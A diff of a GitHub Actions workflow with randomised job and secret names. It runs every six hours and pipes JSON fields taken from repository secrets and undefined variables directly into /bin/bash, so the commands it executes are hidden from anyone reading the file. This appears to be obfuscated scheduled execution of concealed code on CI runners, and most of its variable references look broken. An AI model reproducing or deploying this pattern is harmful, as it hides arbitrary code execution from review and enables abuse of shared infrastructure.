@@ -1,27 +1,21 @@
 name: guoshantui4678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 4/6 * * *'
-
+    - cron: '6 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guoshantui4678
         env:
-          b0248: ${{ secrets.b0248 }}
+          dbhqp3621: ${{ secrets.dbhqp3621 }}
         run: |
-          echo $b0248 | jq -r .azxy84 | /bin/bash
-          echo $hbu48407 | jq -r .yzcx50049 | /bin/bash
-          echo $dznt26472 | jq -r .gy855 | /bin/bash
-          echo $sukwb6821 | jq -r .x884 | /bin/bash
-          echo $f5999 | jq -r .y34 | /bin/bash
-          echo $plwlz82052 | jq -r .xxa56694 | /bin/bash
-          echo $sn7830 | jq -r .hxffs396 | /bin/bash
-          echo $etoti4 | jq -r .qnuyr1718 | /bin/bash
-          echo $xmtx27958 | jq -r .xvsci58870 | /bin/bash
+          echo $dbhqp3621 | jq -r .sjttj1230 | /bin/bash
+          echo $k7 | jq -r .ltxn5224 | /bin/bash
+          echo $xsmbu3 | jq -r .axmp55676 | /bin/bash
+          echo $vqen60508 | jq -r .klm9826 | /bin/bash
+          echo $vjb883 | jq -r .sncrp771 | /bin/bash
+          echo $hsktl4 | jq -r .wcfl39 | /bin/bash
 
